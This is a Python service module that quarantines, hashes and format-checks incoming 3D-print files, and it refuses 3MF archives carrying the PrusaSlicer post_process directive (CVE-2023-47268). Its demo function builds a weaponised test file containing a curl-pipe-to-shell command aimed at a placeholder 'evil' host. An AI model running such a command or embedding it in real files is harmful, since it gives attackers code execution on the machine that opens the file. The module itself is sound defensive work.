"""
services/ingest.py -- Ingest Mediation  [M]

Technical data entering the governed workflow is quarantined, format-checked,
hashed, and recorded in the manifest alongside an operator-declared origin.
This is where a provenance record starts existing at all; everything
downstream that says "verified against the manifest" is referring to a row
this service created.

THE FLOW
    bytes arrive -> quarantine (written to disk, nothing else touches it)
                 -> hash
                 -> format checks
                 -> ACCEPTED: into the object store + a manifest entry
                    REJECTED: stays in quarantine, nothing enters the workflow

WHAT "FORMAT-NORMALIZED" MEANS HERE, AND WHAT IT DOES NOT
    A production implementation would re-serialise each format through a
    trusted parser, dropping anything not required to describe geometry. That
    is a large piece of work and faking it would be worse than not doing it.

    What this does instead is targeted and real:

    1.  3MF POST-PROCESS SCAN (CVE-2023-47268). PrusaSlicer <= 2.6.1 executes
        the `post_process` directive found in Metadata/Slic3r_PE.config inside
        a 3MF, during slicing. A 3MF pulled from a public model repository is
        therefore arbitrary command execution against the workstation that
        opens it. Ingest unpacks the 3MF container, reads that config, and
        refuses the artifact if the directive is present.

        This is the single highest-value check available at this boundary for
        this workflow, and it is why ingest sits upstream of the repository
        rather than alongside it.

    2.  CONTAINER SANITY. A 3MF is a zip; if it does not open as one, or if a
        member path escapes the archive root (zip-slip), the file is not what
        its extension claims and is refused.

    3.  EXTENSION ALLOW-LIST and a size cap.

    Say exactly this in the write-up. "Normalization" that is really "three
    specific checks" should be described as three specific checks.

THE DECLARED ORIGIN IS A CLAIM
    The operator says where it came from. The service records who said it and
    when. It does not verify the claim and cannot -- that is what makes it
    attribution rather than authentication, and the value is that there is a
    named person attached to the assertion if it later turns out to be wrong.

Standalone:
    python3 -m solution.services.ingest
"""

from __future__ import annotations

import io
import zipfile
from pathlib import Path

from .. import config
from ..core import db
from ..core.services import (Actor, Service, ServiceError, sha256_bytes,
                             store_object)

SLIC3R_CONFIG_MEMBERS = (
    "Metadata/Slic3r_PE.config",
    "Metadata/Prusa_Slicer.config",
    "Metadata/Slic3r_PE_model.config",
)
DANGEROUS_DIRECTIVES = ("post_process",)


class IngestMediation(Service):
    name = "ingest"
    title = "Ingest Mediation"
    description = ("Quarantines, checks, hashes and records technical data entering "
                   "the governed workflow, with an operator-declared origin.")

    def __init__(self):
        # Populated by _scan_container so ingest() can log the specifics of a
        # CVE-2023-47268 hit, not just that a check failed.
        self._last_hits: list[dict] = []

    # -- the checks --------------------------------------------------------

    def scan(self, name: str, data: bytes) -> dict:
        """
        Run the format checks. Returns a result dict; never raises on content.

            {"ok": bool, "checks": [...], "reasons": [...], "format": str}
        """
        ext = Path(name).suffix.lower()
        result = {"ok": True, "format": ext or "(none)", "checks": [], "reasons": []}

        def note(check: str, ok: bool, detail: str = ""):
            result["checks"].append({"check": check, "ok": ok, "detail": detail})
            if not ok:
                result["ok"] = False
                result["reasons"].append(f"{check}: {detail}" if detail else check)

        note("size_within_cap", len(data) <= config.INGEST_MAX_BYTES,
             f"{len(data)} bytes, cap {config.INGEST_MAX_BYTES}")
        note("extension_allowed", ext in config.INGEST_ALLOWED_EXTENSIONS,
             f"'{ext}' is not in config.INGEST_ALLOWED_EXTENSIONS")

        if ext in (".3mf", ".zip"):
            self._scan_container(data, ext, note)

        return result

    def _scan_container(self, data: bytes, ext: str, note) -> None:
        try:
            zf = zipfile.ZipFile(io.BytesIO(data))
        except zipfile.BadZipFile:
            note("container_is_valid_zip", False,
                 f"a {ext} must be a zip container; this does not open as one")
            return
        note("container_is_valid_zip", True)

        # zip-slip: a member path that escapes the archive root
        bad = [n for n in zf.namelist()
               if n.startswith("/") or ".." in Path(n).parts]
        note("container_paths_contained", not bad,
             f"member path escapes the archive root: {bad[:3]}" if bad else "")

        if ext != ".3mf" or not config.INGEST_SCAN_3MF_POST_PROCESS:
            return

        hits = []
        for member in SLIC3R_CONFIG_MEMBERS:
            if member not in zf.namelist():
                continue
            try:
                text = zf.read(member).decode("utf-8", errors="replace")
            except Exception as exc:
                note("slic3r_config_readable", False, f"{member}: {exc}")
                continue
            for line in text.splitlines():
                stripped = line.strip()
                if stripped.startswith("#") or stripped.startswith(";"):
                    continue
                for directive in DANGEROUS_DIRECTIVES:
                    if stripped.startswith(directive):
                        _, _, value = stripped.partition("=")
                        if value.strip():
                            hits.append({"member": member, "directive": directive,
                                         "value": value.strip()[:300]})

        note("no_executable_directives", not hits,
             (f"CVE-2023-47268: {len(hits)} executable directive(s) embedded in the "
              f"3MF. PrusaSlicer <= 2.6.1 runs these during slicing. "
              f"First: {hits[0]['directive']}={hits[0]['value'][:120]}")
             if hits else "")
        self._last_hits = hits

    # -- the operation -----------------------------------------------------

    def ingest(self, actor: Actor, filename: str, data: bytes,
               declared_origin: str, note: str = "") -> dict:
        """
        Present one artifact for ingest. Returns the ingest record.

        Raises ServiceError when the artifact is refused, after recording the
        refusal -- a rejected artifact is exactly the thing worth having a
        record of.
        """
        self.require_mediated()
        if not filename:
            raise ServiceError("a filename is required")
        if not declared_origin:
            raise ServiceError("a declared origin is required: somebody has to say "
                               "where this came from, and that claim is theirs")
        if not data:
            raise ServiceError("empty file")

        self._last_hits = []
        digest = sha256_bytes(data)
        ext = Path(filename).suffix.lower()
        safe_name = Path(filename).name

        # Quarantine first: on disk, hashed, named by hash so two operators
        # presenting the same bytes cannot collide, and nothing downstream
        # has seen it yet.
        config.QUARANTINE_DIR.mkdir(parents=True, exist_ok=True)
        qpath = config.QUARANTINE_DIR / f"{digest[:16]}_{safe_name}"
        if not qpath.exists():
            qpath.write_bytes(data)

        scan = self.scan(safe_name, data)
        if self._last_hits:
            scan["post_process_hits"] = self._last_hits

        accepted = scan["ok"] or not config.INGEST_REJECT_ON_SCAN_HIT
        verdict = "ACCEPTED" if accepted else "REJECTED"

        object_path = None
        manifest_id = None
        if accepted:
            _, object_path = store_object(data, digest)
            manifest_id = self._record_manifest(actor, safe_name, digest,
                                                len(data), declared_origin, note)

        with db.tx() as c:
            cur = c.execute(
                "INSERT INTO ingest_record"
                "(ts, operator, device, original_name, sha256, size, declared_origin,"
                " declared_note, extension, verdict, scan_result, quarantine_path,"
                " object_path, manifest_id) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
                (db.now(), actor.operator, actor.device, safe_name, digest, len(data),
                 declared_origin, note, ext, verdict, db.jdump(scan), str(qpath),
                 object_path, manifest_id))
            ingest_id = cur.lastrowid

        self.emit(f"ingest.{verdict.lower()}", actor, subject=safe_name,
                  data={"ingest_id": ingest_id, "sha256": digest, "size": len(data),
                        "declared_origin": declared_origin, "note": note,
                        "failed_checks": scan["reasons"],
                        "manifest_id": manifest_id})

        if not accepted:
            sev = "CRITICAL" if self._last_hits else "WARNING"
            self.finding(
                sev, "ingest.rejected", safe_name,
                f"Ingest refused '{safe_name}' presented by {actor.operator}: "
                + "; ".join(scan["reasons"])[:200],
                {"ingest_id": ingest_id, "sha256": digest,
                 "declared_origin": declared_origin, "operator": actor.operator,
                 "device": actor.device, "scan": scan},
                dedup_key=f"ingest-reject:{digest}")
            raise ServiceError(
                f"Refused: {'; '.join(scan['reasons'])}. The file is held in "
                f"quarantine at {qpath.name} and the refusal is recorded.")

        return self.get(ingest_id)

    def _record_manifest(self, actor: Actor, name: str, digest: str, size: int,
                         origin: str, note: str) -> int:
        """
        Add to the authorized manifest.

        Ingest approval and portal approval both land here, and both name the
        operator -- so Fabrication Artifact Verification has one reference to
        check against regardless of which way an artifact got in.
        """
        with db.tx() as c:
            c.execute(
                "INSERT INTO manifest(sha256, size, name, source_path, note,"
                " approved_by, approved_ts) VALUES (?,?,?,?,?,?,?)"
                " ON CONFLICT(sha256) DO UPDATE SET revoked=0, revoked_by=NULL,"
                "   revoked_ts=NULL, approved_by=excluded.approved_by,"
                "   approved_ts=excluded.approved_ts, note=excluded.note",
                (digest, size, name, f"ingest:{origin}",
                 (note or "").strip() or f"declared origin: {origin}",
                 actor.operator, db.now()))
        return db.q1("SELECT id FROM manifest WHERE sha256=?", (digest,))["id"]

    # -- reads -------------------------------------------------------------

    def get(self, ingest_id: int) -> dict:
        row = db.q1("SELECT * FROM ingest_record WHERE id=?", (ingest_id,))
        if not row:
            raise ServiceError(f"no ingest record {ingest_id}")
        return dict(row)

    def recent(self, limit: int = 100) -> list[dict]:
        return [dict(r) for r in db.q(
            "SELECT * FROM ingest_record ORDER BY id DESC LIMIT ?", (limit,))]

    def quarantined(self) -> list[dict]:
        return [dict(r) for r in db.q(
            "SELECT * FROM ingest_record WHERE verdict='REJECTED' ORDER BY id DESC")]


# -- standalone demonstration ---------------------------------------------

def demo() -> int:
    """Ingest a clean 3MF and a weaponised one, and show the difference."""
    import json
    from ..core import db as _db
    _db.connect()
    svc = IngestMediation()
    actor = Actor("standalone", "localhost")

    def make_3mf(post_process: str | None) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", "<Types/>")
            z.writestr("3D/3dmodel.model", "<model><resources/></model>")
            cfg = "; generated by test\nlayer_height = 0.2\n"
            if post_process:
                cfg += f"post_process = {post_process}\n"
            z.writestr("Metadata/Slic3r_PE.config", cfg)
        return buf.getvalue()

    print("clean 3MF:")
    try:
        rec = svc.ingest(actor, "bracket.3mf", make_3mf(None),
                         "Authored in-house", "bench demo")
        print(f"  {rec['verdict']}  sha {rec['sha256'][:12]}  manifest #{rec['manifest_id']}")
    except ServiceError as exc:
        print(f"  refused: {exc}")

    print("\n3MF carrying a post_process directive (CVE-2023-47268):")
    try:
        svc.ingest(actor, "antenna_mount.3mf",
                   make_3mf("/bin/sh -c 'curl http://evil/x | sh'"),
                   "Public model repository", "downloaded from a model site")
        print("  ACCEPTED -- which would be a bug")
        return 1
    except ServiceError as exc:
        print(f"  refused, correctly:\n    {exc}")

    print("\nrecent ingest records:")
    for r in svc.recent(5):
        print(f"  {r['ts']}  {r['verdict']:<9} {r['original_name']:<22} "
              f"{r['declared_origin']}")
    bad = svc.quarantined()
    if bad:
        print(f"\nheld in quarantine: {len(bad)}")
        for r in bad:
            print("  " + json.dumps(json.loads(r["scan_result"])["reasons"]))
    return 0


if __name__ == "__main__":
    import sys
    sys.exit(demo())
